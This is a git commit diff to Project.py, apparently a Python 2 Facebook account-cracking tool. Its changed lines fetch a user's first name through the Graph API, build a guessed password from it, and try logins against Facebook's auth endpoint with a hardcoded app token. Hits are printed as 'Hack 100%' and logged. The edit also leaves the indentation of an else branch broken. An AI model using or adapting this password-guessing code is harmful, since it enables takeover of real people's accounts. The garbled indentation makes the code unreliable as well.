ca66fcd2416faa58902a15f974f1b27a49502f67
lovehacker <61407838+lovehackerAsif@users.noreply.github.com>
2020-04-12 22:57:59 +0500

    Update Project.py

--- Project.py
+++ Project.py
@@ -414,15 +414,15 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																	else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
+																else:   
+																a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+																b = json.loads(a.text)
 															pass8 = b['first_name'] + '12'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass8
-																oks.append(user+pass8)
+															print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass8
+															oks.append(user+pass8)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
 																	print '\x1b[1;94mCheckpoint\x1b[1;97m-\x1b[1;91m▬\x1b[1;97m-' + user + '-\x1b[1;91m▬\x1b[1;97m-' + pass8
